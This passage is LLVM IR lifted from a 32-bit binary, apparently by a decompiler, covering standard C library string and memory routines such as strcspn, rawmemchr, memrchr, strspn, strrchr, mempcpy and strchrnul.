  %v0_1b774 = load i32, i32* @r0, align 4
  store i32 %v0_1b774, i32* %r4.global-to-local, align 4
  %v2_1b774 = icmp eq i32 %v0_1b774, 0
  %v1_1b778 = load i32, i32* @r2, align 4
  br i1 %v2_1b774, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1b778 = inttoptr i32 %v1_1b778 to i32*
  %v3_1b778 = load i32, i32* %v2_1b778, align 4
  store i32 %v3_1b778, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1b77c = phi i32 [ %v3_1b778, %bb ], [ %v0_1b774, %entry ]
  store i32 %v0_1b77c, i32* @r0, align 4
  store i32 %v1_1b778, i32* %r5.global-to-local, align 4
  %v0_1b784 = load i32, i32* @r1, align 4
  store i32 %v0_1b784, i32* %r6.global-to-local, align 4
  %v1_1b788 = inttoptr i32 %v0_1b77c to i8*
  %v2_1b788 = call i32 @__GI_strspn(i8* %v1_1b788)
  %v0_1b78c = load i32, i32* %r4.global-to-local, align 4
  %v2_1b78c = add i32 %v0_1b78c, %v2_1b788
  %v3_1b78c = inttoptr i32 %v2_1b78c to i8*
  %v4_1b78c = load i8, i8* %v3_1b78c, align 1
  %v6_1b78c = zext i8 %v4_1b78c to i32
  store i32 %v6_1b78c, i32* %r3.global-to-local, align 4
  store i32 %v2_1b78c, i32* @r4, align 4
  %v2_1b794 = icmp eq i8 %v4_1b78c, 0
  br i1 %v2_1b794, label %bb8, label %dec_label_pc_1b7a0

bb8:                                              ; preds = %entry._crit_edge
  %v2_1b798 = load i32, i32* %r5.global-to-local, align 4
  %v3_1b798 = inttoptr i32 %v2_1b798 to i32*
  store i32 %v2_1b78c, i32* %v3_1b798, align 4
  br label %dec_label_pc_1b7dc

dec_label_pc_1b7a0:                               ; preds = %entry._crit_edge
  %v0_1b7a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b7a8 = call i32 @__GI_strpbrk(i8* %v3_1b78c, i32 %v0_1b7a0)
  %v3_1b7ac = icmp eq i32 %v3_1b7a8, 0
  br i1 %v3_1b7ac, label %dec_label_pc_1b7b4, label %dec_label_pc_1b7cc

dec_label_pc_1b7b4:                               ; preds = %dec_label_pc_1b7a0
  %v0_1b7b8 = load i32, i32* @r4, align 4
  store i32 %v0_1b7b8, i32* @r0, align 4
  %v2_1b7bc = call i32 @rawmemchr(i32 %v0_1b7b8, i32 0)
  %v0_1b7c0 = load i32, i32* @r4, align 4
  store i32 %v0_1b7c0, i32* %r3.global-to-local, align 4
  %v1_1b7c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b7c4 = inttoptr i32 %v1_1b7c4 to i32*
  store i32 %v2_1b7bc, i32* %v2_1b7c4, align 4
  br label %dec_label_pc_1b7dc

dec_label_pc_1b7cc:                               ; preds = %dec_label_pc_1b7a0
  %v4_1b7a8 = inttoptr i32 %v3_1b7a8 to i8*
  store i8 0, i8* %v4_1b7a8, align 1
  %v7_1b7d0 = add i32 %v3_1b7a8, 1
  %v1_1b7d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b7d4 = inttoptr i32 %v1_1b7d4 to i32*
  store i32 %v7_1b7d0, i32* %v2_1b7d4, align 4
  %v0_1b7d8 = load i32, i32* @r4, align 4
  store i32 %v0_1b7d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b7dc

dec_label_pc_1b7dc:                               ; preds = %bb8, %dec_label_pc_1b7b4, %dec_label_pc_1b7cc
  %v0_1b7dc = load i32, i32* %r3.global-to-local, align 4
  %v2_1b7e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b7e0, i32* @r4, align 4
  ret i32 %v0_1b7dc

; uselistorder directives
  uselistorder i32 %v3_1b7a8, { 0, 2, 1 }
  uselistorder i32 %v0_1b77c, { 1, 0 }
  uselistorder i32 %v0_1b774, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b7dc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1b7e8 = load i32, i32* @r4, align 4
  store i32 %v3_1b7e8, i32* %stack_var_-16, align 4
  %v6_1b7e8 = load i32, i32* @r5, align 4
  %v9_1b7e8 = load i32, i32* @r6, align 4
  %v0_1b7ec = load i32, i32* @r0, align 4
  %v0_1b7f0 = load i32, i32* @r1, align 4
  store i32 %v0_1b7f0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1b80c8 = inttoptr i32 %v0_1b7ec to i8*
  %v2_1b80c9 = load i8, i8* %v1_1b80c8, align 1
  %v2_1b81011 = icmp eq i8 %v2_1b80c9, 0
  store i32 %v0_1b7f0, i32* @r0, align 4
  %v1_1b81812 = add i32 %v0_1b7ec, 1
  store i32 %v1_1b81812, i32* @r4, align 4
  br i1 %v2_1b81011, label %dec_label_pc_1b820, label %dec_label_pc_1b7fc

dec_label_pc_1b7fc:                               ; preds = %entry, %dec_label_pc_1b808
  %v3_1b80c14.in = phi i8 [ %v2_1b80c, %dec_label_pc_1b808 ], [ %v2_1b80c9, %entry ]
  %v0_1b81413 = phi i32 [ %v0_1b814.pre, %dec_label_pc_1b808 ], [ %v0_1b7f0, %entry ]
  %v3_1b80c14 = zext i8 %v3_1b80c14.in to i32
  %v2_1b7fc = call i32 @__GI_strchr(i32 %v0_1b81413, i32 %v3_1b80c14)
  %v2_1b800 = icmp eq i32 %v2_1b7fc, 0
  %v0_1b808 = load i32, i32* @r5, align 4
  br i1 %v2_1b800, label %dec_label_pc_1b808, label %dec_label_pc_1b820

dec_label_pc_1b808:                               ; preds = %dec_label_pc_1b7fc
  %v1_1b808 = add i32 %v0_1b808, 1
  %v0_1b80c.pre = load i32, i32* @r4, align 4
  %v0_1b814.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b808, i32* @r5, align 4
  %v1_1b80c = inttoptr i32 %v0_1b80c.pre to i8*
  %v2_1b80c = load i8, i8* %v1_1b80c, align 1
  %v2_1b810 = icmp eq i8 %v2_1b80c, 0
  store i32 %v0_1b814.pre, i32* @r0, align 4
  %v1_1b818 = add i32 %v0_1b80c.pre, 1
  store i32 %v1_1b818, i32* @r4, align 4
  br i1 %v2_1b810, label %dec_label_pc_1b820, label %dec_label_pc_1b7fc

dec_label_pc_1b820:                               ; preds = %dec_label_pc_1b808, %dec_label_pc_1b7fc, %entry
  %v0_1b820 = phi i32 [ 0, %entry ], [ %v0_1b808, %dec_label_pc_1b7fc ], [ %v1_1b808, %dec_label_pc_1b808 ]
  %v2_1b824 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b824, i32* @r4, align 4
  store i32 %v6_1b7e8, i32* @r5, align 4
  store i32 %v9_1b7e8, i32* @r6, align 4
  ret i32 %v0_1b820

; uselistorder directives
  uselistorder i8 %v2_1b80c, { 1, 0 }
  uselistorder i32 %v0_1b814.pre, { 1, 0 }
  uselistorder i32 %v0_1b80c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1b7fc, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1b830 = urem i32 %arg1, 256
  %v0_1b8482 = load i32, i32* @r0, align 4
  %v1_1b8483 = urem i32 %v0_1b8482, 4
  %v2_1b8484 = icmp eq i32 %v1_1b8483, 0
  br i1 %v2_1b8484, label %dec_label_pc_1b850, label %dec_label_pc_1b838

dec_label_pc_1b838:                               ; preds = %entry, %dec_label_pc_1b844
  %v0_1b844 = phi i32 [ %v1_1b844, %dec_label_pc_1b844 ], [ %v0_1b8482, %entry ]
  %v1_1b838 = inttoptr i32 %v0_1b844 to i8*
  %v2_1b838 = load i8, i8* %v1_1b838, align 1
  %v3_1b838 = zext i8 %v2_1b838 to i32
  %v9_1b83c = icmp eq i32 %v3_1b838, %v1_1b830
  br i1 %v9_1b83c, label %dec_label_pc_1b8cc, label %dec_label_pc_1b844

dec_label_pc_1b844:                               ; preds = %dec_label_pc_1b838
  %v1_1b844 = add i32 %v0_1b844, 1
  %v1_1b848 = urem i32 %v1_1b844, 4
  %v2_1b848 = icmp eq i32 %v1_1b848, 0
  br i1 %v2_1b848, label %dec_label_pc_1b850, label %dec_label_pc_1b838

dec_label_pc_1b850:                               ; preds = %dec_label_pc_1b844, %entry
  %v0_1b854 = phi i32 [ %v0_1b8482, %entry ], [ %v1_1b844, %dec_label_pc_1b844 ]
  %v4_1b850 = mul nuw nsw i32 %v1_1b830, 256
  %v5_1b850 = or i32 %v4_1b850, %v1_1b830
  %v4_1b858 = mul i32 %v5_1b850, 65536
  %v5_1b858 = or i32 %v4_1b858, %v5_1b850
  br label %dec_label_pc_1b85c

dec_label_pc_1b85c:                               ; preds = %dec_label_pc_1b8bc, %dec_label_pc_1b85c, %dec_label_pc_1b850
  %v0_1b8a0 = phi i32 [ %v0_1b854, %dec_label_pc_1b850 ], [ %v4_1b85c, %dec_label_pc_1b85c ], [ %v4_1b85c, %dec_label_pc_1b8bc ]
  %v1_1b85c = inttoptr i32 %v0_1b8a0 to i32*
  %v2_1b85c = load i32, i32* %v1_1b85c, align 4
  %v4_1b85c = add i32 %v0_1b8a0, 4
  %v2_1b864 = xor i32 %v2_1b85c, %v5_1b858
  %v2_1b868 = add i32 %v2_1b864, 2130640639
  %v1_1b870 = sub i32 -1, %v2_1b864
  %v2_1b874 = xor i32 %v2_1b868, %v1_1b870
  %v2_1b878 = and i32 %v2_1b874, -2130640640
  %v2_1b87c = icmp eq i32 %v2_1b878, 0
  br i1 %v2_1b87c, label %dec_label_pc_1b85c, label %dec_label_pc_1b884

dec_label_pc_1b884:                               ; preds = %dec_label_pc_1b85c
  %v2_1b884 = inttoptr i32 %v0_1b8a0 to i8*
  %v3_1b884 = load i8, i8* %v2_1b884, align 1
  %v4_1b884 = zext i8 %v3_1b884 to i32
  %v9_1b88c = icmp eq i32 %v4_1b884, %v1_1b830
  %v1_1b890 = add i32 %v0_1b8a0, 3
  br i1 %v9_1b88c, label %dec_label_pc_1b8cc, label %dec_label_pc_1b898

dec_label_pc_1b898:                               ; preds = %dec_label_pc_1b884
  %v1_1b898 = add i32 %v0_1b8a0, 1
  %v2_1b898 = inttoptr i32 %v1_1b898 to i8*
  %v3_1b898 = load i8, i8* %v2_1b898, align 1
  %v4_1b898 = zext i8 %v3_1b898 to i32
  %v9_1b89c = icmp eq i32 %v4_1b898, %v1_1b830
  br i1 %v9_1b89c, label %bb, label %dec_label_pc_1b8ac

bb:                                               ; preds = %dec_label_pc_1b898
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8ac:                               ; preds = %dec_label_pc_1b898
  %v1_1b8ac = add i32 %v0_1b8a0, 2
  %v2_1b8ac = inttoptr i32 %v1_1b8ac to i8*
  %v3_1b8ac = load i8, i8* %v2_1b8ac, align 1
  %v4_1b8ac = zext i8 %v3_1b8ac to i32
  %v9_1b8b0 = icmp eq i32 %v4_1b8ac, %v1_1b830
  br i1 %v9_1b8b0, label %dec_label_pc_1b8cc, label %dec_label_pc_1b8bc

dec_label_pc_1b8bc:                               ; preds = %dec_label_pc_1b8ac
  %v2_1b8bc = inttoptr i32 %v1_1b890 to i8*
  %v3_1b8bc = load i8, i8* %v2_1b8bc, align 1
  %v4_1b8bc = zext i8 %v3_1b8bc to i32
  %v9_1b8c0 = icmp eq i32 %v4_1b8bc, %v1_1b830
  br i1 %v9_1b8c0, label %dec_label_pc_1b8c8, label %dec_label_pc_1b85c

dec_label_pc_1b8c8:                               ; preds = %dec_label_pc_1b8bc
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8cc:                               ; preds = %dec_label_pc_1b838, %dec_label_pc_1b8ac, %dec_label_pc_1b884, %bb, %dec_label_pc_1b8c8
  %v1_1b8d0 = phi i32 [ %v1_1b890, %dec_label_pc_1b8c8 ], [ %v1_1b898, %bb ], [ %v1_1b8ac, %dec_label_pc_1b8ac ], [ %v0_1b8a0, %dec_label_pc_1b884 ], [ %v0_1b844, %dec_label_pc_1b838 ]
  ret i32 %v1_1b8d0

; uselistorder directives
  uselistorder i32 %v4_1b85c, { 1, 0 }
  uselistorder i32 %v0_1b8a0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1b850, { 1, 0 }
  uselistorder i32 %v1_1b844, { 1, 0, 2 }
  uselistorder i32 %v0_1b8482, { 2, 1, 0 }
  uselistorder i32 %v1_1b830, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1b8cc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1b838, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1b8e0 = urem i32 %arg2, 256
  %v2_1b8e4 = add i32 %arg3, %arg1
  %v2_1b8fc4 = icmp eq i32 %arg3, 0
  br i1 %v2_1b8fc4, label %dec_label_pc_1b90c, label %dec_label_pc_1b904

dec_label_pc_1b8ec:                               ; preds = %dec_label_pc_1b904
  %v1_1b8ec = add i32 %v0_1b8ec, -1
  %v2_1b8ec = inttoptr i32 %v1_1b8ec to i8*
  %v3_1b8ec = load i8, i8* %v2_1b8ec, align 1
  %v4_1b8ec = zext i8 %v3_1b8ec to i32
  %v9_1b8f0 = icmp eq i32 %v4_1b8ec, %v1_1b8e0
  br i1 %v9_1b8f0, label %dec_label_pc_1b9ac, label %dec_label_pc_1b8f8

dec_label_pc_1b8f8:                               ; preds = %dec_label_pc_1b8ec
  %v1_1b8f8 = add i32 %v0_1b8f8, -1
  %v2_1b8fc = icmp eq i32 %v1_1b8f8, 0
  br i1 %v2_1b8fc, label %dec_label_pc_1b90c, label %dec_label_pc_1b904

dec_label_pc_1b904:                               ; preds = %entry, %dec_label_pc_1b8f8
  %v0_1b8f8 = phi i32 [ %v1_1b8f8, %dec_label_pc_1b8f8 ], [ %arg3, %entry ]
  %v0_1b8ec = phi i32 [ %v1_1b8ec, %dec_label_pc_1b8f8 ], [ %v2_1b8e4, %entry ]
  %v1_1b904 = urem i32 %v0_1b8ec, 4
  %v2_1b904 = icmp eq i32 %v1_1b904, 0
  br i1 %v2_1b904, label %dec_label_pc_1b90c, label %dec_label_pc_1b8ec

dec_label_pc_1b90c:                               ; preds = %dec_label_pc_1b8f8, %dec_label_pc_1b904, %entry
  %v0_1b99413 = phi i32 [ %v2_1b8e4, %entry ], [ %v1_1b8ec, %dec_label_pc_1b8f8 ], [ %v0_1b8ec, %dec_label_pc_1b904 ]
  %v0_1b9809 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1b8f8 ], [ %v0_1b8f8, %dec_label_pc_1b904 ]
  %v4_1b90c = mul nuw nsw i32 %v1_1b8e0, 256
  %v5_1b90c = or i32 %v4_1b90c, %v1_1b8e0
  %v4_1b910 = mul i32 %v5_1b90c, 65536
  %v5_1b910 = or i32 %v4_1b910, %v5_1b90c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1b9809, 3
  br i1 %tmp, label %dec_label_pc_1b918, label %dec_label_pc_1b9a0

dec_label_pc_1b918:                               ; preds = %dec_label_pc_1b90c, %dec_label_pc_1b980.backedge
  %v0_1b93440 = phi i32 [ %v1_1b934, %dec_label_pc_1b980.backedge ], [ %v0_1b9809, %dec_label_pc_1b90c ]
  %v0_1b91839 = phi i32 [ %v1_1b918, %dec_label_pc_1b980.backedge ], [ %v0_1b99413, %dec_label_pc_1b90c ]
  %v1_1b918 = add i32 %v0_1b91839, -4
  %v2_1b918 = inttoptr i32 %v1_1b918 to i32*
  %v3_1b918 = load i32, i32* %v2_1b918, align 4
  %v2_1b91c = xor i32 %v3_1b918, %v5_1b910
  %v2_1b920 = add i32 %v2_1b91c, 2130640639
  store i32 %v2_1b920, i32* @ip, align 4
  %v1_1b924 = sub i32 -1, %v2_1b91c
  %v2_1b928 = xor i32 %v2_1b920, %v1_1b924
  %v2_1b92c = and i32 %v2_1b928, -2130640640
  %v2_1b930 = icmp eq i32 %v2_1b92c, 0
  %v1_1b934 = add i32 %v0_1b93440, -4
  br i1 %v2_1b930, label %dec_label_pc_1b980.backedge, label %dec_label_pc_1b93c

dec_label_pc_1b980.backedge:                      ; preds = %dec_label_pc_1b918, %dec_label_pc_1b974
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1b934, 3
  br i1 %tmp46, label %dec_label_pc_1b918, label %dec_label_pc_1b9a0

dec_label_pc_1b93c:                               ; preds = %dec_label_pc_1b918
  %v1_1b93c = add i32 %v0_1b91839, -1
  %v2_1b93c = inttoptr i32 %v1_1b93c to i8*
  %v3_1b93c = load i8, i8* %v2_1b93c, align 1
  %v4_1b93c = zext i8 %v3_1b93c to i32
  %v9_1b940 = icmp eq i32 %v4_1b93c, %v1_1b8e0
  br i1 %v9_1b940, label %dec_label_pc_1b96c, label %dec_label_pc_1b94c

dec_label_pc_1b94c:                               ; preds = %dec_label_pc_1b93c
  %v1_1b94c = add i32 %v0_1b91839, -2
  %v2_1b94c = inttoptr i32 %v1_1b94c to i8*
  %v3_1b94c = load i8, i8* %v2_1b94c, align 1
  %v4_1b94c = zext i8 %v3_1b94c to i32
  %v9_1b950 = icmp eq i32 %v4_1b94c, %v1_1b8e0
  br i1 %v9_1b950, label %dec_label_pc_1b96c, label %dec_label_pc_1b95c

dec_label_pc_1b95c:                               ; preds = %dec_label_pc_1b94c
  %v1_1b95c = add i32 %v0_1b91839, -3
  %v2_1b95c = inttoptr i32 %v1_1b95c to i8*
  %v3_1b95c = load i8, i8* %v2_1b95c, align 1
  %v4_1b95c = zext i8 %v3_1b95c to i32
  %v9_1b960 = icmp eq i32 %v4_1b95c, %v1_1b8e0
  br i1 %v9_1b960, label %dec_label_pc_1b96c, label %dec_label_pc_1b974

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b95c, %dec_label_pc_1b94c, %dec_label_pc_1b93c
  %v0_1b96c = phi i32 [ %v1_1b95c, %dec_label_pc_1b95c ], [ %v1_1b94c, %dec_label_pc_1b94c ], [ %v1_1b93c, %dec_label_pc_1b93c ]
  br label %dec_label_pc_1b9ac

dec_label_pc_1b974:                               ; preds = %dec_label_pc_1b95c
  %v1_1b974 = inttoptr i32 %v1_1b918 to i8*
  %v2_1b974 = load i8, i8* %v1_1b974, align 1
  %v3_1b974 = zext i8 %v2_1b974 to i32
  %v9_1b978 = icmp eq i32 %v3_1b974, %v1_1b8e0
  br i1 %v9_1b978, label %dec_label_pc_1b9ac, label %dec_label_pc_1b980.backedge

dec_label_pc_1b994:                               ; preds = %dec_label_pc_1b9a0
  %v1_1b9a0 = add i32 %v0_1b9a0, -1
  %v1_1b994 = add i32 %v0_1b994, -1
  %v2_1b994 = inttoptr i32 %v1_1b994 to i8*
  %v3_1b994 = load i8, i8* %v2_1b994, align 1
  %v4_1b994 = zext i8 %v3_1b994 to i32
  %v9_1b998 = icmp eq i32 %v4_1b994, %v1_1b8e0
  br i1 %v9_1b998, label %dec_label_pc_1b9ac, label %dec_label_pc_1b9a0

dec_label_pc_1b9a0:                               ; preds = %dec_label_pc_1b90c, %dec_label_pc_1b980.backedge, %dec_label_pc_1b994
  %v0_1b994 = phi i32 [ %v1_1b994, %dec_label_pc_1b994 ], [ %v0_1b99413, %dec_label_pc_1b90c ], [ %v1_1b918, %dec_label_pc_1b980.backedge ]
  %v0_1b9a0 = phi i32 [ %v1_1b9a0, %dec_label_pc_1b994 ], [ %v0_1b9809, %dec_label_pc_1b90c ], [ %v1_1b934, %dec_label_pc_1b980.backedge ]
  %v2_1b9a0 = icmp eq i32 %v0_1b9a0, 0
  br i1 %v2_1b9a0, label %dec_label_pc_1b9a8, label %dec_label_pc_1b994

dec_label_pc_1b9a8:                               ; preds = %dec_label_pc_1b9a0
  br label %dec_label_pc_1b9ac

dec_label_pc_1b9ac:                               ; preds = %dec_label_pc_1b8ec, %dec_label_pc_1b974, %dec_label_pc_1b994, %dec_label_pc_1b96c, %dec_label_pc_1b9a8
  %v1_1b9b0 = phi i32 [ %v0_1b96c, %dec_label_pc_1b96c ], [ 0, %dec_label_pc_1b9a8 ], [ %v1_1b994, %dec_label_pc_1b994 ], [ %v1_1b918, %dec_label_pc_1b974 ], [ %v1_1b8ec, %dec_label_pc_1b8ec ]
  ret i32 %v1_1b9b0

; uselistorder directives
  uselistorder i32 %v0_1b9a0, { 1, 0 }
  uselistorder i32 %v1_1b934, { 1, 0, 2 }
  uselistorder i32 %v1_1b918, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1b91839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b90c, { 1, 0 }
  uselistorder i32 %v0_1b9809, { 1, 2, 0 }
  uselistorder i32 %v0_1b8ec, { 1, 0, 2 }
  uselistorder i32 %v2_1b8e4, { 1, 0 }
  uselistorder i32 %v1_1b8e0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b9ac, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1b9a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b980.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1b918, { 1, 0 }
  uselistorder label %dec_label_pc_1b90c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b904, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1b9ec2 = load i32, i32* @r0, align 4
  %v1_1b9ec3 = inttoptr i32 %v0_1b9ec2 to i8*
  %v2_1b9ec4 = load i8, i8* %v1_1b9ec3, align 1
  %v3_1b9ec5 = zext i8 %v2_1b9ec4 to i32
  store i32 %v3_1b9ec5, i32* @ip, align 4
  %v2_1b9f06 = icmp eq i8 %v2_1b9ec4, 0
  br i1 %v2_1b9f06, label %dec_label_pc_1b9fc, label %dec_label_pc_1b9d0.preheader

dec_label_pc_1b9c8:                               ; preds = %dec_label_pc_1b9d0
  %v3_1b9d0 = zext i8 %v2_1b9d0 to i32
  %v1_1b9d8 = add i32 %v0_1b9d8, 1
  %v9_1b9c8 = icmp eq i32 %v0_1b9c810, %v3_1b9d0
  br i1 %v9_1b9c8, label %dec_label_pc_1b9e4, label %dec_label_pc_1b9d0

dec_label_pc_1b9d0:                               ; preds = %dec_label_pc_1b9d0.preheader, %dec_label_pc_1b9c8
  %v0_1b9d8 = phi i32 [ %tmp, %dec_label_pc_1b9d0.preheader ], [ %v1_1b9d8, %dec_label_pc_1b9c8 ]
  %v1_1b9d0 = inttoptr i32 %v0_1b9d8 to i8*
  %v2_1b9d0 = load i8, i8* %v1_1b9d0, align 1
  %v2_1b9d4 = icmp eq i8 %v2_1b9d0, 0
  br i1 %v2_1b9d4, label %dec_label_pc_1b9fc, label %dec_label_pc_1b9c8

dec_label_pc_1b9e4:                               ; preds = %dec_label_pc_1b9c8
  %v1_1b9e4 = add i32 %v0_1b9e4, 1
  %v1_1b9e8 = add i32 %v0_1b9e8, 1
  %v1_1b9ec = inttoptr i32 %v1_1b9e8 to i8*
  %v2_1b9ec = load i8, i8* %v1_1b9ec, align 1
  %v3_1b9ec = zext i8 %v2_1b9ec to i32
  store i32 %v3_1b9ec, i32* @ip, align 4
  %v2_1b9f0 = icmp eq i8 %v2_1b9ec, 0
  br i1 %v2_1b9f0, label %dec_label_pc_1b9fc, label %dec_label_pc_1b9d0.preheader

dec_label_pc_1b9d0.preheader:                     ; preds = %entry, %dec_label_pc_1b9e4
  %v0_1b9e8 = phi i32 [ %v1_1b9e8, %dec_label_pc_1b9e4 ], [ %v0_1b9ec2, %entry ]
  %v0_1b9e4 = phi i32 [ %v1_1b9e4, %dec_label_pc_1b9e4 ], [ 0, %entry ]
  %v0_1b9c810 = phi i32 [ %v3_1b9ec, %dec_label_pc_1b9e4 ], [ %v3_1b9ec5, %entry ]
  br label %dec_label_pc_1b9d0

dec_label_pc_1b9fc:                               ; preds = %dec_label_pc_1b9e4, %dec_label_pc_1b9d0, %entry
  %v0_1b9fc = phi i32 [ 0, %entry ], [ %v0_1b9e4, %dec_label_pc_1b9d0 ], [ %v1_1b9e4, %dec_label_pc_1b9e4 ]
  ret i32 %v0_1b9fc

; uselistorder directives
  uselistorder i32 %v0_1b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_1b9d0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1ba0c = urem i32 %arg2, 256
  store i32 %v1_1ba0c, i32* @r4, align 4
  %v2_1ba0c = icmp eq i32 %v1_1ba0c, 0
  br i1 %v2_1ba0c, label %dec_label_pc_1ba20, label %dec_label_pc_1ba34.preheader

dec_label_pc_1ba34.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1ba3c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1ba0c)
  %v2_1ba405 = icmp eq i32 %v2_1ba3c3, 0
  br i1 %v2_1ba405, label %dec_label_pc_1ba48, label %dec_label_pc_1ba2c

dec_label_pc_1ba20:                               ; preds = %entry
  %v2_1ba24 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1ba4c

dec_label_pc_1ba2c:                               ; preds = %dec_label_pc_1ba34.preheader, %dec_label_pc_1ba2c
  %v2_1ba3c6 = phi i32 [ %v2_1ba3c, %dec_label_pc_1ba2c ], [ %v2_1ba3c3, %dec_label_pc_1ba34.preheader ]
  store i32 %v2_1ba3c6, i32* @r5, align 4
  %v1_1ba30 = add i32 %v2_1ba3c6, 1
  store i32 %v1_1ba30, i32* @r0, align 4
  %v0_1ba38 = load i32, i32* @r4, align 4
  %v2_1ba3c = call i32 @__GI_strchr(i32 %v1_1ba30, i32 %v0_1ba38)
  %v2_1ba40 = icmp eq i32 %v2_1ba3c, 0
  br i1 %v2_1ba40, label %dec_label_pc_1ba48, label %dec_label_pc_1ba2c

dec_label_pc_1ba48:                               ; preds = %dec_label_pc_1ba2c, %dec_label_pc_1ba34.preheader
  %v0_1ba48 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ba4c

dec_label_pc_1ba4c:                               ; preds = %dec_label_pc_1ba20, %dec_label_pc_1ba48
  %storemerge = phi i32 [ %v2_1ba24, %dec_label_pc_1ba20 ], [ %v0_1ba48, %dec_label_pc_1ba48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1ba3c, { 1, 0 }
  uselistorder i32 %v1_1ba30, { 1, 0 }
  uselistorder i32 %v1_1ba0c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_1ba2c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1ba58 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1ba68 = call i32 @memcpy()
  %v0_1ba6c = load i32, i32* @r5, align 4
  %v1_1ba6c = load i32, i32* @r4, align 4
  %v2_1ba6c = add i32 %v1_1ba6c, %v0_1ba6c
  store i32 %v6_1ba58, i32* @r5, align 4
  ret i32 %v2_1ba6c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1ba80 = urem i32 %arg1, 256
  %v0_1baa02 = load i32, i32* @r0, align 4
  %v1_1baa03 = urem i32 %v0_1baa02, 4
  %v2_1baa04 = icmp eq i32 %v1_1baa03, 0
  br i1 %v2_1baa04, label %dec_label_pc_1baa8, label %dec_label_pc_1ba88

dec_label_pc_1ba88:                               ; preds = %entry, %dec_label_pc_1ba9c
  %v0_1ba9c = phi i32 [ %v1_1ba9c, %dec_label_pc_1ba9c ], [ %v0_1baa02, %entry ]
  %v1_1ba88 = inttoptr i32 %v0_1ba9c to i8*
  %v2_1ba88 = load i8, i8* %v1_1ba88, align 1
  %v3_1ba88 = zext i8 %v2_1ba88 to i32
  %v9_1ba8c = icmp eq i32 %v3_1ba88, %v1_1ba80
  br i1 %v9_1ba8c, label %dec_label_pc_1bb58, label %dec_label_pc_1ba94

dec_label_pc_1ba94:                               ; preds = %dec_label_pc_1ba88
  %v2_1ba94 = icmp eq i8 %v2_1ba88, 0
  br i1 %v2_1ba94, label %dec_label_pc_1bb58, label %dec_label_pc_1ba9c

dec_label_pc_1ba9c:                               ; preds = %dec_label_pc_1ba94
  %v1_1ba9c = add i32 %v0_1ba9c, 1
  %v1_1baa0 = urem i32 %v1_1ba9c, 4
  %v2_1baa0 = icmp eq i32 %v1_1baa0, 0
  br i1 %v2_1baa0, label %dec_label_pc_1baa8, label %dec_label_pc_1ba88

dec_label_pc_1baa8:                               ; preds = %dec_label_pc_1ba9c, %entry
  %v0_1baac = phi i32 [ %v0_1baa02, %entry ], [ %v1_1ba9c, %dec_label_pc_1ba9c ]
  %v4_1baa8 = mul nuw nsw i32 %v1_1ba80, 256
  %v5_1baa8 = or i32 %v4_1baa8, %v1_1ba80
  %v4_1bab0 = mul i32 %v5_1baa8, 65536
  %v5_1bab0 = or i32 %v4_1bab0, %v5_1baa8
